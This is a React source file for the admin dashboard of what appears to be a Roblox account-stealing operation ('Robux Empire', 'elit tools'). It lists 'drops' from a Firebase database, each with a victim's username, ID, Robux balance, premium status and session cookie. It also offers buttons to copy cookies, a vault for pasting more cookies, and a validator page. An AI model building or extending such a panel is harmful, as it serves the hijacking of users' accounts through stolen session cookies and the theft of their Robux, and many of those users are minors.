"use client"

import { useEffect, useState, useMemo } from "react"
import { ref, onValue, remove, set } from "firebase/database"
import { getFirebaseDatabase } from "@/lib/firebase"
import { useAuth } from "@/lib/auth-context"
import {
  LayoutDashboard,
  KeyRound,
  Lock,
  Star,
  Shuffle,
  CheckCircle,
  MessageCircle,
  User,
  Settings,
  ShieldCheck,
  Crown,
  LogOut,
  Search,
  RefreshCw,
  Trash2,
  Copy,
  Check,
  ChevronDown,
  ChevronUp,
  X,
  Cookie,
} from "lucide-react"

interface Drop {
  id: string
  user: string
  userid: string
  robux: number
  premium: boolean
  cookie: string
  time: string | number
}

type NavPage =
  | "dashboard"
  | "accounts"
  | "private"
  | "favorites"
  | "random"
  | "validator"
  | "chat"
  | "profile"
  | "settings"
  | "admin"
  | "discord-admin"

const sidebarNav: { icon: typeof LayoutDashboard; label: string; page: NavPage }[] = [
  { icon: LayoutDashboard, label: "Dashboard", page: "dashboard" },
  { icon: KeyRound, label: "Accounts", page: "accounts" },
  { icon: Lock, label: "Private", page: "private" },
  { icon: Star, label: "Favorites", page: "favorites" },
  { icon: Shuffle, label: "Random", page: "random" },
  { icon: CheckCircle, label: "Validator", page: "validator" },
  { icon: MessageCircle, label: "Chat", page: "chat" },
  { icon: User, label: "Profile", page: "profile" },
  { icon: Settings, label: "Settings", page: "settings" },
  { icon: ShieldCheck, label: "Admin", page: "admin" },
  { icon: Crown, label: "Discord Admin", page: "discord-admin" },
]

export function Dashboard() {
  const { user, signOut } = useAuth()
  const [drops, setDrops] = useState<Drop[]>([])
  const [loading, setLoading] = useState(true)
  const [activePage, setActivePage] = useState<NavPage>("dashboard")
  const [search, setSearch] = useState("")
  const [copiedId, setCopiedId] = useState<string | null>(null)
  const [expandedId, setExpandedId] = useState<string | null>(null)
  const [deleteMode, setDeleteMode] = useState(false)
  const [sidebarOpen, setSidebarOpen] = useState(true)

  // Cookie validator
  const [cookieInput, setCookieInput] = useState("")
  const [validating, setValidating] = useState(false)

  useEffect(() => {
    const db = getFirebaseDatabase()
    const dropsRef = ref(db, "drops")
    const unsubscribe = onValue(dropsRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const arr: Drop[] = Object.entries(data).map(([key, value]) => ({
          id: key,
          ...(value as Omit<Drop, "id">),
        }))
        setDrops(arr)
      } else {
        setDrops([])
      }
      setLoading(false)
    })
    return () => unsubscribe()
  }, [])

  const stats = useMemo(() => {
    const totalRobux = drops.reduce((s, d) => s + (Number(d.robux) || 0), 0)
    const premiumCount = drops.filter((d) => d.premium).length
    const uniqueUsers = new Set(drops.map((d) => d.userid)).size
    return { total: drops.length, totalRobux, premiumCount, uniqueUsers }
  }, [drops])

  const favorites = useMemo(() => drops.filter((d) => d.premium), [drops])
  const favoritesRobux = useMemo(
    () => favorites.reduce((s, d) => s + (Number(d.robux) || 0), 0),
    [favorites]
  )

  const filtered = useMemo(() => {
    if (!search) return drops
    const q = search.toLowerCase()
    return drops.filter(
      (d) =>
        d.user?.toLowerCase().includes(q) ||
        d.userid?.toString().toLowerCase().includes(q) ||
        d.cookie?.toLowerCase().includes(q)
    )
  }, [drops, search])

  const filteredFavorites = useMemo(() => {
    if (!search) return favorites
    const q = search.toLowerCase()
    return favorites.filter(
      (d) =>
        d.user?.toLowerCase().includes(q) ||
        d.userid?.toString().toLowerCase().includes(q)
    )
  }, [favorites, search])

  async function handleCopy(id: string, cookie: string) {
    try {
      await navigator.clipboard.writeText(cookie)
      setCopiedId(id)
      setTimeout(() => setCopiedId(null), 2000)
    } catch {
      // fallback
    }
  }

  async function handleDelete(id: string) {
    try {
      const dropRef = ref(getFirebaseDatabase(), `drops/${id}`)
      await remove(dropRef)
    } catch {
      // error
    }
  }

  async function handleDeleteAll() {
    try {
      const dropsRef = ref(getFirebaseDatabase(), "drops")
      await set(dropsRef, null)
    } catch {
      // error
    }
  }

  function handleRemoveDuplicates() {
    const seen = new Map<string, string>()
    const duplicateIds: string[] = []
    for (const drop of drops) {
      if (drop.cookie && seen.has(drop.cookie)) {
        duplicateIds.push(drop.id)
      } else if (drop.cookie) {
        seen.set(drop.cookie, drop.id)
      }
    }
    duplicateIds.forEach((id) => {
      const dropRef = ref(database, `drops/${id}`)
      remove(dropRef)
    })
  }

  function handleValidateCookie() {
    if (!cookieInput.trim()) return
    setValidating(true)
    setTimeout(() => setValidating(false), 2000)
  }

  function formatTime(time: string | number) {
    if (!time) return "N/A"
    try {
      const date = new Date(
        typeof time === "number"
          ? time
          : isNaN(Number(time))
            ? time
            : Number(time)
      )
      if (isNaN(date.getTime())) return String(time)
      return date.toLocaleString()
    } catch {
      return String(time)
    }
  }

  function AccountRow({ drop }: { drop: Drop }) {
    const isExpanded = expandedId === drop.id
    return (
      <div className="border-b border-border/30 last:border-b-0">
        <div className="flex items-center gap-3 px-5 py-3 transition-colors hover:bg-muted/20">
          {/* Avatar */}
          <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-secondary text-sm font-bold text-secondary-foreground">
            {drop.user?.[0]?.toUpperCase() || "?"}
          </div>

          {/* Name & handle */}
          <div className="flex min-w-0 flex-1 flex-col">
            <div className="flex items-center gap-1.5">
              <span className="truncate text-sm font-semibold text-foreground">
                {drop.user || "Unknown"}
              </span>
              {drop.premium && <Star className="h-3 w-3 text-amber-500" />}
            </div>
            <span className="truncate text-xs text-muted-foreground">
              @{drop.userid || "unknown"}
            </span>
            <div className="flex items-center gap-1 mt-0.5">
              <Cookie className="h-3 w-3 text-primary" />
              <span className="text-xs font-medium text-primary">
                {Number(drop.robux || 0).toLocaleString()}
              </span>
            </div>
          </div>

          {/* Actions */}
          <div className="flex items-center gap-1">
            <button
              onClick={() => setExpandedId(isExpanded ? null : drop.id)}
              className="rounded-md p-1.5 text-muted-foreground transition-colors hover:bg-muted hover:text-foreground"
              aria-label="Expand"
            >
              {isExpanded ? (
                <ChevronUp className="h-4 w-4" />
              ) : (
                <ChevronDown className="h-4 w-4" />
              )}
            </button>
            <button
              onClick={() => handleCopy(drop.id, drop.cookie)}
              className="rounded-md p-1.5 text-muted-foreground transition-colors hover:bg-muted hover:text-foreground"
              aria-label="Copy cookie"
            >
              {copiedId === drop.id ? (
                <Check className="h-4 w-4 text-emerald-400" />
              ) : (
                <Copy className="h-4 w-4" />
              )}
            </button>
            {deleteMode && (
              <button
                onClick={() => handleDelete(drop.id)}
                className="rounded-md p-1.5 text-muted-foreground transition-colors hover:bg-destructive/20 hover:text-primary"
                aria-label="Delete"
              >
                <Trash2 className="h-4 w-4" />
              </button>
            )}
          </div>
        </div>

        {/* Expanded details */}
        {isExpanded && (
          <div className="border-t border-border/20 bg-muted/10 px-5 py-3">
            <div className="grid grid-cols-2 gap-3 text-xs">
              <div>
                <span className="text-muted-foreground">User ID</span>
                <p className="mt-0.5 font-mono text-foreground">
                  {drop.userid || "N/A"}
                </p>
              </div>
              <div>
                <span className="text-muted-foreground">Robux</span>
                <p className="mt-0.5 font-semibold text-primary">
                  {Number(drop.robux || 0).toLocaleString()}
                </p>
              </div>
              <div>
                <span className="text-muted-foreground">Premium</span>
                <p className="mt-0.5 text-foreground">
                  {drop.premium ? "Yes" : "No"}
                </p>
              </div>
              <div>
                <span className="text-muted-foreground">Time</span>
                <p className="mt-0.5 text-foreground">
                  {formatTime(drop.time)}
                </p>
              </div>
              <div className="col-span-2">
                <span className="text-muted-foreground">Cookie</span>
                <p className="mt-0.5 break-all rounded bg-muted/50 p-2 font-mono text-[11px] text-muted-foreground">
                  {drop.cookie || "N/A"}
                </p>
              </div>
            </div>
          </div>
        )}
      </div>
    )
  }

  // Page content renderers
  function renderDashboard() {
    return (
      <div className="flex flex-col gap-6">
        <div>
          <h1 className="font-serif text-4xl font-black italic tracking-tight text-primary md:text-5xl">
            DASHBOARD
          </h1>
          <p className="mt-1 text-sm text-muted-foreground">
            Overview of all accounts and activity
          </p>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-2 gap-4 md:grid-cols-4">
          {[
            {
              icon: KeyRound,
              value: stats.total,
              label: "Total Accounts",
            },
            {
              icon: Cookie,
              value: stats.totalRobux.toLocaleString(),
              label: "Total Robux",
              highlight: true,
            },
            {
              icon: Star,
              value: stats.premiumCount,
              label: "Premium",
            },
            {
              icon: User,
              value: stats.uniqueUsers,
              label: "Unique Users",
            },
          ].map((stat) => (
            <div
              key={stat.label}
              className="flex flex-col items-center gap-2 rounded-lg border border-border bg-card p-5"
            >
              <stat.icon
                className={`h-5 w-5 ${stat.highlight ? "text-primary" : "text-muted-foreground"}`}
              />
              <span
                className={`text-2xl font-bold ${stat.highlight ? "text-primary" : "text-foreground"}`}
              >
                {stat.value}
              </span>
              <span className="text-xs text-muted-foreground">
                {stat.label}
              </span>
            </div>
          ))}
        </div>

        {/* Recent accounts */}
        <div className="rounded-lg border border-border bg-card">
          <div className="flex items-center justify-between border-b border-border px-5 py-3">
            <h2 className="text-sm font-semibold text-foreground">
              Recent Accounts
            </h2>
            <span className="text-xs text-muted-foreground">
              {drops.length} total
            </span>
          </div>
          {loading ? (
            <div className="flex flex-col gap-2 p-5">
              {Array.from({ length: 4 }).map((_, i) => (
                <div
                  key={i}
                  className="h-12 animate-pulse rounded-md bg-muted"
                />
              ))}
            </div>
          ) : drops.length === 0 ? (
            <EmptyState />
          ) : (
            <div>
              {drops.slice(0, 10).map((drop) => (
                <AccountRow key={drop.id} drop={drop} />
              ))}
            </div>
          )}
        </div>
      </div>
    )
  }

  function renderAccounts() {
    return (
      <div className="flex flex-col gap-6">
        <div>
          <h1 className="font-serif text-4xl font-black italic tracking-tight text-primary md:text-5xl">
            ACCOUNT VAULT
          </h1>
          <p className="mt-1 text-sm text-muted-foreground">
            {stats.total} accounts &middot; {stats.totalRobux.toLocaleString()}{" "}
            total Robux &middot; External 0 (+0)
          </p>
        </div>

        {/* Add cookie */}
        <div className="rounded-lg border border-border bg-card p-5">
          <div className="mb-3 flex items-center gap-2">
            <Cookie className="h-4 w-4 text-primary" />
            <h2 className="text-sm font-bold uppercase tracking-wide text-foreground">
              Add Cookie to Vault
            </h2>
          </div>
          <textarea
            value={cookieInput}
            onChange={(e) => setCookieInput(e.target.value)}
            placeholder="Paste your Roblox cookie(s) here... (one per line for multiple)"
            className="min-h-[100px] w-full resize-none rounded-lg border border-border bg-input p-3 font-mono text-sm text-foreground placeholder:text-muted-foreground/60 outline-none transition-colors focus:border-primary focus:ring-1 focus:ring-primary"
          />
          <button
            onClick={handleValidateCookie}
            disabled={validating || !cookieInput.trim()}
            className="mt-3 flex w-full items-center justify-center gap-2 rounded-lg bg-primary py-2.5 text-sm font-medium text-primary-foreground transition-all hover:bg-primary/90 disabled:opacity-50"
          >
            {validating ? (
              <RefreshCw className="h-4 w-4 animate-spin" />
            ) : (
              <Cookie className="h-4 w-4" />
            )}
            {validating ? "Validating..." : "Validate Cookie"}
          </button>
        </div>

        {/* Action bar */}
        <div className="flex flex-wrap items-center gap-3">
          <div className="relative flex-1 max-w-xs">
            <Search className="pointer-events-none absolute left-3 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-muted-foreground" />
            <input
              placeholder="Search username or display..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="h-9 w-full rounded-lg border border-border bg-input pl-9 pr-3 text-sm text-foreground placeholder:text-muted-foreground/60 outline-none transition-colors focus:border-primary focus:ring-1 focus:ring-primary"
            />
          </div>
          <button className="flex items-center gap-1.5 rounded-lg border border-border bg-card px-3 py-2 text-xs font-medium text-foreground transition-colors hover:bg-muted">
            <RefreshCw className="h-3.5 w-3.5" />
          </button>
          <button className="flex items-center gap-1.5 rounded-lg border border-border bg-card px-3 py-2 text-xs font-medium text-foreground transition-colors hover:bg-muted">
            <RefreshCw className="h-3.5 w-3.5" />
            {"Refresh All Pending R$"}
          </button>
          <button
            onClick={handleRemoveDuplicates}
            className="flex items-center gap-1.5 rounded-lg border border-border bg-card px-3 py-2 text-xs font-medium text-foreground transition-colors hover:bg-muted"
          >
            <CheckCircle className="h-3.5 w-3.5" />
            Remove Duplicate Roblox Cookies
          </button>
          <button
            onClick={handleDeleteAll}
            className="flex items-center gap-1.5 rounded-lg bg-primary/90 px-3 py-2 text-xs font-medium text-primary-foreground transition-colors hover:bg-primary"
          >
            <Trash2 className="h-3.5 w-3.5" />
            Delete All
          </button>
        </div>

        <button
          onClick={() => setDeleteMode(!deleteMode)}
          className={`self-start rounded-lg px-3 py-1.5 text-xs font-medium transition-colors ${
            deleteMode
              ? "bg-primary/20 text-primary border border-primary/30"
              : "bg-secondary text-secondary-foreground"
          }`}
        >
          Delete Mode
        </button>

        {/* Accounts list */}
        <div className="rounded-lg border border-border bg-card">
          {loading ? (
            <div className="flex flex-col gap-2 p-5">
              {Array.from({ length: 5 }).map((_, i) => (
                <div
                  key={i}
                  className="h-12 animate-pulse rounded-md bg-muted"
                />
              ))}
            </div>
          ) : filtered.length === 0 ? (
            <EmptyState />
          ) : (
            <div>
              {filtered.map((drop) => (
                <AccountRow key={drop.id} drop={drop} />
              ))}
            </div>
          )}
        </div>
      </div>
    )
  }

  function renderFavorites() {
    return (
      <div className="flex flex-col gap-6">
        <div>
          <h1 className="font-serif text-4xl font-black italic tracking-tight text-primary md:text-5xl">
            FAVORITES
          </h1>
          <p className="mt-1 text-sm text-muted-foreground">
            Your saved favorite accounts with full details
          </p>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-2 gap-4 md:grid-cols-4">
          {[
            { icon: Star, value: favorites.length, label: "Favorites" },
            {
              icon: Cookie,
              value: favoritesRobux.toLocaleString(),
              label: "Total Robux",
              highlight: true,
            },
            { icon: KeyRound, value: 0, label: "With Cards" },
            { icon: Crown, value: 0, label: "With Servers" },
          ].map((stat) => (
            <div
              key={stat.label}
              className="flex flex-col items-center gap-2 rounded-lg border border-border bg-card p-5"
            >
              <stat.icon
                className={`h-5 w-5 ${stat.highlight ? "text-primary" : "text-muted-foreground"}`}
              />
              <span
                className={`text-2xl font-bold ${stat.highlight ? "text-primary" : "text-foreground"}`}
              >
                {stat.value}
              </span>
              <span className="text-xs text-muted-foreground">
                {stat.label}
              </span>
            </div>
          ))}
        </div>

        {/* Search */}
        <div className="relative max-w-md">
          <Search className="pointer-events-none absolute left-3 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-muted-foreground" />
          <input
            placeholder="Search favorites..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="h-9 w-full rounded-lg border border-border bg-input pl-9 pr-3 text-sm text-foreground placeholder:text-muted-foreground/60 outline-none transition-colors focus:border-primary focus:ring-1 focus:ring-primary"
          />
        </div>

        {/* Favorites list */}
        <div className="rounded-lg border border-border bg-card">
          {filteredFavorites.length === 0 ? (
            <EmptyState />
          ) : (
            <div>
              {filteredFavorites.map((drop) => (
                <AccountRow key={drop.id} drop={drop} />
              ))}
            </div>
          )}
        </div>
      </div>
    )
  }

  function renderValidator() {
    return (
      <div className="flex flex-col gap-6">
        <div>
          <h1 className="font-serif text-4xl font-black italic tracking-tight text-primary md:text-5xl">
            VALIDATOR
          </h1>
          <p className="mt-1 text-sm text-muted-foreground">
            Validate Roblox cookies quickly
          </p>
        </div>

        <div className="rounded-lg border border-border bg-card p-5">
          <textarea
            value={cookieInput}
            onChange={(e) => setCookieInput(e.target.value)}
            placeholder="Paste cookies here, one per line..."
            className="min-h-[200px] w-full resize-none rounded-lg border border-border bg-input p-3 font-mono text-sm text-foreground placeholder:text-muted-foreground/60 outline-none transition-colors focus:border-primary focus:ring-1 focus:ring-primary"
          />
          <button
            onClick={handleValidateCookie}
            disabled={validating || !cookieInput.trim()}
            className="mt-3 flex w-full items-center justify-center gap-2 rounded-lg bg-primary py-3 text-sm font-medium text-primary-foreground transition-all hover:bg-primary/90 disabled:opacity-50"
          >
            {validating ? (
              <RefreshCw className="h-4 w-4 animate-spin" />
            ) : (
              <CheckCircle className="h-4 w-4" />
            )}
            {validating ? "Validating..." : "Validate Cookies"}
          </button>
        </div>
      </div>
    )
  }

  function renderPlaceholder(title: string) {
    return (
      <div className="flex flex-col gap-6">
        <div>
          <h1 className="font-serif text-4xl font-black italic tracking-tight text-primary md:text-5xl">
            {title.toUpperCase()}
          </h1>
          <p className="mt-1 text-sm text-muted-foreground">
            This section is coming soon
          </p>
        </div>
        <div className="flex flex-col items-center justify-center rounded-lg border border-border bg-card py-20">
          <Crown className="h-12 w-12 text-primary/20" />
          <p className="mt-4 text-sm text-muted-foreground">Coming soon</p>
        </div>
      </div>
    )
  }

  function EmptyState() {
    return (
      <div className="relative flex flex-col items-center justify-center overflow-hidden py-16">
        <p className="relative z-10 text-sm text-muted-foreground">
          No accounts in vault
        </p>
        <span className="pointer-events-none absolute font-serif text-8xl font-bold italic text-primary/[0.04]">
          elit tools
        </span>
      </div>
    )
  }

  function renderPage() {
    switch (activePage) {
      case "dashboard":
        return renderDashboard()
      case "accounts":
        return renderAccounts()
      case "favorites":
        return renderFavorites()
      case "validator":
        return renderValidator()
      case "private":
        return renderPlaceholder("Private")
      case "random":
        return renderPlaceholder("Random")
      case "chat":
        return renderPlaceholder("Chat")
      case "profile":
        return renderPlaceholder("Profile")
      case "settings":
        return renderPlaceholder("Settings")
      case "admin":
        return renderPlaceholder("Admin")
      case "discord-admin":
        return renderPlaceholder("Discord Admin")
      default:
        return renderDashboard()
    }
  }

  return (
    <div className="flex h-screen bg-background overflow-hidden">
      {/* Sidebar */}
      <aside
        className={`flex shrink-0 flex-col bg-sidebar border-r border-sidebar-border transition-all duration-300 ${
          sidebarOpen ? "w-56" : "w-0 overflow-hidden border-r-0"
        }`}
      >
        {/* Brand header */}
        <div className="flex h-14 items-center gap-2 border-b border-sidebar-border px-4">
          <div className="flex h-8 w-8 items-center justify-center rounded-md bg-primary">
            <Crown className="h-4 w-4 text-primary-foreground" />
          </div>
          <div className="flex flex-col">
            <span className="text-xs font-black uppercase tracking-wider text-primary">
              Robux
            </span>
            <span className="text-xs font-black uppercase tracking-wider text-primary">
              Empire
            </span>
          </div>
        </div>

        {/* Nav links */}
        <nav className="flex flex-1 flex-col gap-0.5 overflow-y-auto p-2">
          {sidebarNav.map((item) => {
            const isActive = activePage === item.page
            return (
              <button
                key={item.page}
                onClick={() => {
                  setActivePage(item.page)
                  setSearch("")
                }}
                className={`flex items-center gap-3 rounded-md px-3 py-2 text-sm transition-colors ${
                  isActive
                    ? "bg-sidebar-accent text-primary font-semibold"
                    : "text-sidebar-foreground/70 hover:bg-sidebar-accent/50 hover:text-sidebar-foreground"
                }`}
              >
                <item.icon className="h-4 w-4 shrink-0" />
                <span className="truncate">{item.label}</span>
              </button>
            )
          })}
        </nav>

        {/* Bottom actions */}
        <div className="flex flex-col gap-1 border-t border-sidebar-border p-2">
          <a
            href="https://discord.gg"
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center gap-3 rounded-md bg-[#5865F2] px-3 py-2 text-sm font-medium text-foreground transition-colors hover:bg-[#4752C4]"
          >
            <svg viewBox="0 0 24 24" className="h-4 w-4 fill-current">
              <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189z" />
            </svg>
            Discord
          </a>
          <button
            onClick={signOut}
            className="flex items-center gap-3 rounded-md px-3 py-2 text-sm text-primary transition-colors hover:bg-sidebar-accent"
          >
            <LogOut className="h-4 w-4" />
            Logout
          </button>
        </div>
      </aside>

      {/* Main area */}
      <main className="flex flex-1 flex-col overflow-hidden">
        {/* Top bar */}
        <header className="flex h-12 shrink-0 items-center gap-3 border-b border-border px-4">
          <button
            onClick={() => setSidebarOpen(!sidebarOpen)}
            className="rounded-md p-1.5 text-muted-foreground transition-colors hover:bg-muted hover:text-foreground lg:hidden"
            aria-label="Toggle sidebar"
          >
            {sidebarOpen ? (
              <X className="h-4 w-4" />
            ) : (
              <Crown className="h-4 w-4" />
            )}
          </button>
          <span className="text-sm font-medium text-muted-foreground">
            Logged in as{" "}
            <span className="text-foreground">
              {user?.email || "Admin"}
            </span>
          </span>
        </header>

        {/* Scrollable content */}
        <div className="flex-1 overflow-y-auto p-6">
          <div className="mx-auto max-w-5xl">{renderPage()}</div>

          {/* Watermark */}
          <div className="pointer-events-none mt-12 flex select-none justify-center">
            <span className="font-serif text-7xl font-bold italic text-primary/[0.04]">
              elit tools
            </span>
          </div>
        </div>
      </main>
    </div>
  )
}
